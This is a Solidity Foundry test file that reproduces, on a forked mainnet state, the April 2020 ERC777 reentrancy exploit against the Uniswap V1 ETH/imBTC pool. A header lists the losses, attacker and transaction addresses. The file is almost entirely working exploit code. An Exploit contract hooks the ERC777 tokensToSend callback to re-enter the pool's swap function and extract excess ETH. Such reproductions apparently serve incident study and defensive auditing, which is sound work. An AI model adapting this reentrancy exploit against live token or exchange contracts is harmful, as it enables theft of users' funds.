// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~250k USD
//   - 1346.81 ETH
// Vulnerability Type : ERC777 Reentrancy
// Attacked At : Mainnet, block height 9893295, 2020-04-18T00:58:19Z
// Attacker : 0x60f3FdB85B2F7faaa888CA7AfC382c57F6415A81
// Exploit Contract : 0xBD2250D713bf98b7E00c26E2907370aD30f0891a
// Revenue Address : 0x60f3FdB85B2F7faaa888CA7AfC382c57F6415A81
// Victim Contract : 0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187 (Uniswap V1 ETH/IMBTC)
// Vulnerable Snippet : https://etherscan.io/address/0xffcf45b540e6c9f094ae656d2e34ad11cdfdb187#code#L209
// Attack Txs :
//  - 0x9cb1d93d6859883361e8c2f9941f13d6156a1e8daa0ebe801b5d0b5a612723c1 (+0.01 ETH, height 9894249, T+3h24m39s)
//  - (Other 523 Transactions)
//  - 0x9437dde6c06a20f6d56f69b07f43d5fb918e6c57c97e1fc25a4162c693f578aa (+1.45 ETH, height 9893295, T)
//
// @Info
// Auxiliary Contracts : 
//   - 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24 (ERC1820 Registry Contract)
//   - 0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95 (Uniswap V1 Factory Contract)
//   - 0x3212b29E33587A00FB1C83346f5dBFA69A458923 (imBTC Token Contract)
//   - 0x0000000000b3F879cb30FE243b4Dfee438691c04 (GasToken.io GST2 Token)
//   - 0xE7BB30cbfBc84B1be7F2c552d41428554Db84243 (Unknown Contract. The exploit contract used it to obtain enough ETH to bought imBTC)
//
// @Ref
// SlowMist : https://blog.blockmagnates.com/detailed-explanation-of-uniswaps-erc777-re-entry-risk-8fa5b3738e08


contract Attacker is Test {
    /**
     * @dev In this PoC, we reproduced transaction 0x9437dde6c06a20f6d56f69b07f43d5fb918e6c57c97e1fc25a4162c693f578aa.
     * @dev The other attack transactions follow the same logic, differing only in the global state.
     * @dev In the original attack, the exploit contract would make external calls to GasToken.io and an unknown contracts to obtain enough ETH.
     * @dev In this PoC, we skipped those calls, simply used `vm.deal()` to omit the above operations.
     */

    Exploit exploit;

    function setUp() public {
        vm.createSelectFork("mainnet", 9_893_294);
        exploit = new Exploit();
    }


    function testExploit() public {
        vm.deal(address(this), 0); // reset balance
        vm.deal(address(exploit), 80.269322202031652489 ether); // due to we skipped the GasToken.io and `withdrawAll()` calls

        console.log("[Before Attack] address(this).balance = %18e", address(this).balance);

        exploit.func_0xdaf8be1f();
        vm.deal(address(this), address(this).balance - 80.269322202031652489 ether); // restore the balance

        console.log("[After Attack] address(this).balance = %18e", address(this).balance);
    }

    receive() external payable {}

}


contract Exploit {
    IERC1820Registry private constant erc1820Registery = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IUniswapV1Factory private constant uniswapV1Factory  = IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
    IMBTC private constant imBTC = IMBTC(0x3212b29E33587A00FB1C83346f5dBFA69A458923);

    bool reentered;

    constructor() {
        erc1820Registery.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
        erc1820Registery.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    /**
     * @dev Compared to the original Exploit Function,
     * @dev We omitted the external call to GasToken.io and unknown contracts (to get enough ETH).
     */
    function func_0xdaf8be1f() public {
        IUniswapV1 imBTC_ETH = IUniswapV1(uniswapV1Factory.getExchange(address(imBTC)));
        
        uint256 imBTC_bought = imBTC_ETH.ethToTokenSwapInput{value: address(this).balance}(1, type(uint256).max);

        imBTC.approve(address(imBTC_ETH), type(uint256).max);

        imBTC_ETH.tokenToEthSwapInput(imBTC_bought/2, 1, type(uint256).max);
        
        payable(msg.sender).transfer(address(this).balance);
    }

    function tokensToSend(address, address, address, uint256 amount, bytes calldata, bytes calldata) external {
        if (!reentered) {
            reentered = true;
            IUniswapV1 imBTC_ETH = IUniswapV1(uniswapV1Factory.getExchange(address(imBTC)));
            imBTC_ETH.tokenToEthSwapInput(amount, 1, type(uint256).max);
        }
    }        

    receive() external payable {}
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------
// Shortened interface, removed unused methods.

interface IUniswapV1Factory {
    function getExchange(address token) external view returns (address out);
}

interface IMBTC {
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniswapV1 {
    function ethToTokenSwapInput(uint256 min_token, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}
